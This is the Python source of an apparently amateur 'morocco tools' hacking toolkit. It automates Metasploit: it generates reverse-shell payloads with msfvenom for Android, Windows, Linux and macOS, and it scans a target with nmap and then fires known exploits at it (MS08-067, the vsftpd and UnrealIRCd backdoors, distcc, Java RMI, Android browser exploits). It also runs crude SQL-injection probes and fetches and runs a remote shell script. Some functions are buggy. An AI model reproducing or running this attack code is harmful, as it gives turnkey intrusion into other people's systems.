## MT.py - useful module of morocco tools
# -*- coding: utf-8 -*-
import os
import sys
import time
import requests
from bs4 import BeautifulSoup
from tabulate import tabulate
import pandas as pd
import urllib

class bcolors:
    OKGREEN = '\033[92m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    OKBLUE = '\033[94m'
	
tools_banner = """
\033[91m  __  __   _   ____   ___   ____ ____ ___   \033[92m _____ ___   ___  _     ____
\033[91m |  \/  |/ _ \|  _ \ / _ \ / ___/ ___/ _ \  \033[92m|_   _/ _ \ / _ \| |   / ___| 
\033[91m | |\/| | | | | |_) | | | | |  | |  | | | |  \033[92m | || | | | | | | |   \___ \ 
\033[91m | |  | | |_| |  _ <| |_| | |__| |__| |_| |   \033[92m| || |_| | |_| | |___ ___) |
\033[91m |_|  |_|\___/|_| \_\\___/ \____\____ \___/   \033[92m |_| \___/ \___/|_____|____/                                                                                        
                     SCRIPT BY black protocol AND yehia ali
                  ----------------------------------------------
                     website: https://omegeng.blogspot.com                                         
"""
backtomenu_banner = """
  [99] Back to main menu
  [00] Exit the morocco tools
"""
def restart_program():
    python = sys.executable
    os.execl(python, python, * sys.argv)
    curdir = os.getcwd()

def backtomenu_option():
	print (backtomenu_banner)
	backtomenu = raw_input('protocol > ')
	
	if backtomenu == "10":
		restart_program()
	elif backtomenu == "00":
		sys.exit()
	else:
		print ('\033[91mERROR: Wrong Input')
		time.sleep(2)
		restart_program()

def banner():
    print (tools_banner)

def check():
    print '''                          \033[92mcheck version of script          '''
    print '''                              \033[92mpliz wait ...\n               '''
    url = 'https://omegeng.blogspot.com/p/v-1.html'
    v = 'V: 1.2.1'
    r = requests.get(url)
    if v in r.text:
       print                    "Welcome to the MTools\n"
    else:
       print                    '\033[91mpliz update the tool'
       time.sleep(3)
       exit()
       
	
def make_pylaod():
        print  ('\033[92m[*]\033[93mtype pyload = exemple ==> php or android OR windows\033[92m[*]')
        ok = raw_input('\033[92m[+] \033[94mENTER YOUR TYPE PAYLOAD: ')
        time.sleep(2)
        print ('\033[92m[**]\033[93mlhost = exmeple ==> 192.168.1.** OR 45.15.544.25\033[92m[**]')
        time.sleep(2)
        host = raw_input('\033[92m[+] \033[94mENTER YOUR LHOST: ')
        time.sleep(2)
        print  ('\033[92m[***]\033[93mport = exemple ==> 4444 OR any port\033[92m[***]')
        port = raw_input('\033[92m[+] \033[94m ENTER YOUR LPORT: ')
        time.sleep(2)
        print  ('\033[92m[***]\033[93mextension = exemple ==> apk OR exe OR elf\033[92m[***]')
        extension = raw_input('\033[92m[+] \033[94m ENTER YOUR PAYLOAD extension: ')
        time.sleep(2)
        print  ('\033[92m[****]\033[93mdirectory = exemple ==> /sdcard OR any directory you want\033[92m[****]')
        directory = raw_input('\033[92m[+] \033[94mENTER YOUR PYLOAD DIRECTORY: ')
        time.sleep(2)
        print ('\033[92m[*****]\033[93mname pyload = exemple ==> black.apk OR black.php or black.exe\033[92m[*****]')
        name = raw_input('\033[92m[+] \033[94mENTER YOU PYLOAD NAME WITH FINAL: ')
        time.sleep(2)
        make = 'msfvenom -p {} LHOST={} LPORT={} -f {} {}/{}'.format(ok, host, port, extension, directory, name)
        os.system(make)

def connected(host='http://google.com'):
    try:
        urllib.urlopen(host)
        return True
    except:
        return False

if connected():
    print '''                       \033[92m ______________connected_______________            '''

else:
    print   '                                           \033[91mPliz Connect To Internet!!!                               '
    time.sleep(3)
    exit()
    

def start_hacking():
    remove()
    print ('\033[92m[+] starting open metasploit')
    first = raw_input('\033[92m[+] \033[94mEnter lhost: ')
    time.sleep(2)
    first1 = raw_input('\033[92m[+] \033[94mEnter lport: ')
    time.sleep(2)
    first2 = raw_input('\033[92m[+] \033[94mEnter type payload: ')
    time.sleep(2)
    os.system('service postgresql start')
    file = open('starthack.rc','w')
    type1 = 'use exploit/multi/handler\n'
    type2 = 'set payload {}/meterpreter/reverse_tcp\n'.format(first2)
    ip1 = 'set LHOST {}\n'.format(first)
    ip2 = 'set LPORT {}\n'.format(first1)
    start = 'exploit\n'
    file.write(type1 + type2 + ip1 + ip2 + start)
    file.close()
    os.system('msfconsole -r starthack.rc')
    time.sleep(4)

def scan_ip():
    remove()
    os.system('pkg install nmap')
    os.system('apt-get install nmap')
    nm = "nmap "
    out = ">>nmap.txt"
    ip = raw_input("\033[92m[+] \033[94mEnter ip of you target: ")
    time.sleep(2)
    print ("pliz wait ...")
    os.system(nm + ip + out)
    file = open("nmap.txt")
    strings = file.read()
    term = "microsoft-ds"
    if(term in strings):
        hack_445()
        time.sleep(3)
    else:
       print ('\033[91mport 445 is not open in ip')
       time.sleep(3)

    file = open("nmap.txt")
    strings = file.read()
    term = "ftp"
    if(term in strings):
        hack_21()
        time.sleep(3)
    else:
       print ('\033[91mport 21 is not open in ip')
       time.sleep(3)

    file = open("nmap.txt")
    strings = file.read()
    term = "rmiregistry"
    if(term in strings):
        hack_1099()
        time.sleep(3)
    else:
       print ('\033[91mport 1099 is not open in ip')
       time.sleep(3)

    file = open("nmap.txt")
    strings = file.read()
    term = "distcc"
    if(term in strings):
        hack_3632()
        time.sleep(3)
    else:
       print ('\033[91mport 3632 is not open in ip')
       time.sleep(3)

    file = open("nmap.txt")
    strings = file.read()
    term = "irc"
    if(term in strings):
        hack_6667()
        time.sleep(3)
    else:
       print ('\033[91mport 6667 is not open in ip')
       time.sleep(3)      
    file.close()
    
def hack_445():
    remove()
    print ('\033[92m[+] port 445 is open in this ip (ATTACK WINDOWS)')
    os.system('service postgresql start')
    os.system('service metasploit start')
    file = open('hack445.rc','w')
    lhost = raw_input('\033[92m[+] \033[94mEnter your ip: ')
    time.sleep(2)
    rhost = raw_input('\033[92m[+] \033[94mEnter your target ip: ')
    time.sleep(2)
    type1 = 'use exploit/windows/smb/ms08_067_netapi\n'
    type2 = 'set payload windows/meterpreter/reverse_tcp\n'
    type3 = 'set LHOST {}\n'.format(lhost)
    ip4 = 'set RHOST {}\n'.format(rhost)
    ip6 = 'set LPORT 445\n'
    ip5 = 'exploit\n'
    file.write(type1 + type2 + type3 + ip4 + ip6 + ip5)
    file.close()
    os.system('msfconsole -r hack445.rc')
    
def hack_21():
    remove()
    print ('\033[92m[+]port 21 is open in ip')
    os.system('service postgresql start')
    os.system('service metasploit start')
    file = open('hack21.rc','w')
    rhost = raw_input('\033[92m[+] \033[94mEnter your target ip: ')
    time.sleep(2)
    type1 = 'use exploit/unix/ftp/vsftpd_234_backdoor\n'
    type2 = 'set payload cmd/unix/interact\n'
    ip3 = 'set RHOST {}\n'.format(rhost)
    ip4 = 'exploit\n'
    ip5 = 'exploit\n'
    file.write(type1 + type2 + ip3 + ip4 + ip5)
    file.close()
    os.system('msfconsole -r hack21.rc')

def hack_1099():
    remove()
    print ('\033[92m[+]port 1099 is open in ip')
    os.system('service postgresql start')
    os.system('service metasploit start')
    file = open('hack1099.rc','w')
    rhost = raw_input('\033[92m[+] \033[94mEnter your target ip: ')
    time.sleep(2)
    type1 = 'use exploit/multi/misc/java_rmi_server\n'
    type4 = 'set RHOST {}\n'.format(rhost)
    ip4 = 'exploit\n'
    file.write(type1 + type4 + ip4)
    file.close()
    os.system('msfconsole -r hack1099.rc')
		
def remove():
    os.system('rm -r hack21.rc')
    os.system('rm -r nmap.txt')
    os.system('rm -r hack445.rc')   
    os.system('rm -r hack1099.rc')
    os.system('rm -r starthack.rc')
    os.system('rm -r linkhack.rc')
    os.system('rm -r linkhack2.rc')
    os.system('rm -rf hack_3632')
    os.system('rm -rf hack_6667')
    
def link_hack():
    os.system('service postgresql start')
    os.system('service metasploit start')
    print ("\033[92m[+]start open metasploit")
    file = open('linkhack.rc','w')
    lhost = raw_input('\033[92m[+] \033[94mEnter your host: ')
    time.sleep(2)
    lport = raw_input('\033[92m[+] \033[94mEnter your port: ')
    time.sleep(2)
    type1 = 'use auxiliary/server/browser_autopwn\n'
    type2 = 'set LHOST {}\n'.format(lhost)
    type3 = 'set SRVHOST {}\n'.format(lhost)
    type4 = 'set SRVPORT {}\n'.format(lport)
    ip3 = 'set URIPATH test\n'
    ip4 = 'exploit\n'
    file.write(type1 + type2 + type3 + type4 + ip3 + ip4)
    file.close()
    os.system('msfconsole -r linkhack.rc')

def link_hack2():
    os.system('service postgresql start')
    os.system('service metasploit start')
    print ("\033[92m[+]start open metasploit")
    file = open('linkhack2.rc','w')
    lhost = raw_input('\033[92m[+] \033[94mEnter your host: ')
    time.sleep(2)
    type1 = 'use exploit /android/browser/webview_addjavascriptinterface\n'
    type2 = 'set LHOST {}\n'.format(lhost)
    type3 = 'set SRVHOST {}\n'.format(lhost)
    type4 = 'set URIPATH test\n'
    ip4 = 'exploit\n'
    file.write(type1 + type2 + type3 + type4 + ip4)
    file.close()
    os.system('msfconsole -r linkhack2.rc')

def link_hack3():
    os.system('service postgresql start')
    os.system('service metasploit start')
    print ("\033[92m[+]start open metasploit")
    file = open('linkhack3.rc','w')
    lhost = raw_input('\033[92m[+] \033[94mEnter your host: ')
    time.sleep(2)
    type1 = 'use exploit/android/browser/stagefright_mp4_tx3g_64bit\n'
    type2 = 'set SRVHOST {}\n'.format(lhost)
    type3 = 'set URIPATH /\n'
    type4 = 'set PAYLOAD linux/armle/mettle/reverse_tcp\n'
    type5 = 'set LHOST {}\n'.format(lhost)
    ip4 = 'exploit -j\n'
    file.write(type1 + type2 + type3 + type4 + type5 + ip4)
    file.close()
    os.system('msfconsole -r linkhack3.rc')

def metasploit():
    print ("\033[92minstall metasploit")
    os.system('apt update')
    os.system('apt upgrade')
    os.system('pkg install python')
    os.system('pkg install python2')
    os.system('pkg install git')
    os.system('pkg install curl')
    os.system('pkg install wget')
    os.system('pkg install curl')
    os.system('curl -LO https://raw.githubusercontent.com/Hax4us/Metasploit_termux/master/metasploit.sh')
    os.system('chmod 777 metasploit.sh')
    os.system('./metasploit.sh')

def write():
    sympol = ("'")    
    file = open('test.txt')
    for url in file.read().split('\n'):   
        r = requests.get(url + sympol)
        if 'mysql_fetch_array()' in r.text:
            print ('\033[92m\n######  your website is vulnerability ')
        elif  'You have an error in your SQL' in r.text:
            print ('\033[92m\n######  your website is vulnerability ')
        elif  'Warning' in r.text:
            print ('\033[92m\n######  your website is vulnerability ')    
        else:
            print ('\033[91m\n###### your website is not vulnerability')

def sql_injection():
      print 'put you website here'
      write = raw_input("Enter Your Website Here>> ")
      sympol = ("'")
      r = requests.get(write + sympol)
      if 'mysql_fetch_array()' in r.text:
              print ('\033[92m\n######  your website is vulnerability ')
      elif  'You have an error in your SQL' in r.text:
              print ('\033[92m\n######  your website is vulnerability ')
      elif  'Warning' in r.text:
              print ('\033[92m\n######  your website is vulnerability ')    
      else:
              print ('\033[91m\n###### your website is not vulnerability')
            
def python_payload():
        host = raw_input('\033[92m[+] \033[94mENTER YOUR LHOST: ')
        time.sleep(2)
        port = raw_input('\033[92m[+]\033[94m ENTER YOUR LPORT: ')
        time.sleep(2)
        print ('\033[92m[**]\033[93mname of payload\033[92m[**]')
        name = raw_input('\033[92m[+] \033[94mENTER YOUR PAYLOAD NAME: ')
        time.sleep(2)
        make = 'msfvenom -p cmd/unix/reverse_python LHOST={} LPORT={} -f raw > {}.py'.format(host, port, name)
        os.system(make)
        
def perl_payload():
        host = raw_input('\033[92m[+] \033[94mENTER YOUR LHOST: ')
        time.sleep(2)
        port = raw_input('\033[92m[+]\033[94m ENTER YOUR LPORT: ')
        time.sleep(2)
        print ('\033[92m[**]\033[93mname of payload\033[92m[**]')
        name = raw_input('\033[92m[+] \033[94mENTER YOUR PAYLOAD NAME: ')
        time.sleep(2)
        make = 'msfvenom -p cmd/unix/reverse_python LHOST={} LPORT={} -f raw > {}.pl'.format(host, port, name)
        os.system(make)
        
def bash_payload():
        host = raw_input('\033[92m[+] \033[94mENTER YOUR LHOST: ')
        time.sleep(2)
        port = raw_input('\033[92m[+]\033[94m ENTER YOUR LPORT: ')
        time.sleep(2)
        print ('\033[92m[**]\033[93mname of payload\033[92m[**]')
        name = raw_input('\033[92m[+] \033[94mENTER YOUR PAYLOAD NAME: ')
        time.sleep(2)
        make = 'msfvenom -p cmd/unix/reverse_python LHOST={} LPORT={} -f raw > {}.sh'.format(host, port, name)
        os.system(make)
        
def linux_payload():
        host = raw_input('\033[92m[+] \033[94mENTER YOUR LHOST: ')
        time.sleep(2)
        port = raw_input('\033[92m[+]\033[94m ENTER YOUR LPORT: ')
        time.sleep(2)
        print ('\033[92m[**]\033[93mname of payload\033[92m[**]')
        name = raw_input('\033[92m[+] \033[94mENTER YOUR PAYLOAD NAME: ')
        time.sleep(2)
        make = 'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={} LPORT={} -f elf > {}.elf'.format(host, port, name)
        os.system(make)
        
def windows_payload():
        host = raw_input('\033[92m[+] \033[94mENTER YOUR LHOST: ')
        time.sleep(2)
        port = raw_input('\033[92m[+]\033[94m ENTER YOUR LPORT: ')
        time.sleep(2)
        print ('\033[92m[**]\033[93mname of payload\033[92m[**]')
        name = raw_input('\033[92m[+] \033[94mENTER YOUR PYLOAD NAME: ')
        time.sleep(2)
        make = 'msfvenom -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} -f exe > {}.exe'.format(host, port, name)
        os.system(make)
        
def android_payload():
        host = raw_input('\033[92m[+] \033[94mENTER YOUR LHOST: ')
        time.sleep(2)
        port = raw_input('\033[92m[+]\033[94m ENTER YOUR LPORT: ')
        time.sleep(2)
        print ('\033[92m[**]\033[93mname of payload\033[92m[**]')
        name = raw_input('\033[92m[+] \033[94mENTER YOU PYLOAD NAME: ')
        time.sleep(2)
        make = 'msfvenom -p android/meterpreter/reverse_tcp LHOST={} LPORT={} -f apk > {}.apk'.format(host, port, name)
        os.system(make)
        
def mac_payload():
        host = raw_input('\033[92m[+] \033[94mENTER YOUR LHOST: ')
        time.sleep(2)
        port = raw_input('\033[92m[+]\033[94m ENTER YOUR LPORT: ')
        time.sleep(2)
        print ('\033[92m[**]\033[93mname of payload\033[92m[**]')
        name = raw_input('\033[92m[+] \033[94mENTER YOUR PYLOAD NAME: ')
        time.sleep(2)
        make = 'msfvenom -p osx/x86/shell_reverse_tcp LHOST={} LPORT={} -f macho > {}.macho'.format(host, port, name)
        os.system(make)

def hack_3632():
    remove()
    print ('\033[92m[+] port 3632 is open in this ip')
    os.system('service postgresql start')
    os.system('service metasploit start')
    file = open('hack3632.rc','w')
    lhost = raw_input('\033[92m[+] \033[94mEnter your ip: ')
    time.sleep(2)
    rhost = raw_input('\033[92m[+] \033[94mEnter your target ip: ')
    time.sleep(2)
    lport = raw_input('\033[92m[+] \033[94mEnter your port: ')
    time.sleep(2) 
    type1 = 'use exploit/unix/misc/distcc/exec\n'
    type2 = 'set payload cmd/unix/reverse\n'
    type3 = 'set LHOST {}\n'.format(lhost)
    ip4 = 'set RHOST {}\n'.format(rhost)
    ip6 = 'set LPORT {}\n'.format(lport)
    ip7 = 'set RPORT 3632\n'
    ip5 = 'exploit\n'
    file.write(type1 + type2 + type3 + ip4 + ip6 + ip7 + ip5)
    file.close()
    os.system('msfconsole -r hack3632.rc')        
                
def hack_6667():
    remove()
    print ('\033[92m[+] port 6667 is open in this ip')
    os.system('service postgresql start')
    os.system('service metasploit start')
    file = open('hack3632.rc','w')
    lhost = raw_input('\033[92m[+] \033[94mEnter your ip: ')
    time.sleep(2)
    rhost = raw_input('\033[92m[+] \033[94mEnter your target ip: ')
    time.sleep(2)
    lport = raw_input('\033[92m[+] \033[94mEnter your port: ')
    time.sleep(2) 
    type1 = 'use exploit/unix/irc/unreal/_ircd_3281_backdoor\n'
    type2 = 'set payload cmd/unix/reverse\n'
    type3 = 'set LHOST {}\n'.format(lhost)
    ip4 = 'set RHOST {}\n'.format(rhost)
    ip6 = 'set LPORT {}\n'.format(lport)
    ip7 = 'set RPORT 6667\n'
    ip5 = 'exploit\n'
    file.write(type1 + type2 + type3 + ip4 + ip6 + ip7 + ip5)
    file.close()
    os.system('msfconsole -r hack6667.rc')
    
def sprint():
  blah = "Pliz Wait ...\n"

  for l in blah:
    sys.stdout.write(l)
    sys.stdout.flush()
    time.sleep(0.1)

  res = requests.get("https://free-proxy-list.net/anonymous-proxy.html")
  soup = BeautifulSoup(res.content,'lxml')
  table = soup.find_all('table')[0] 
  df = pd.read_html(str(table))
  print( tabulate(df[0], headers='keys', tablefmt='psql') )

def loca():
   blah = "Pliz Wait ...\n"

   for l in blah:
     sys.stdout.write(l)
     sys.stdout.flush()
     time.sleep(0.1)

   res = requests.get("https://iplocation.com")
   soup = BeautifulSoup(res.content,'lxml')
   table = soup.find_all('table')[0] 
   df = pd.read_html(str(table))
   print( tabulate(df[0], headers='keys', tablefmt='psql') )
 
def lazyfix():
   blah = "download ...\n"

   for l in blah:
     sys.stdout.write(l)
     sys.stdout.flush()
     time.sleep(0.1)
    
  
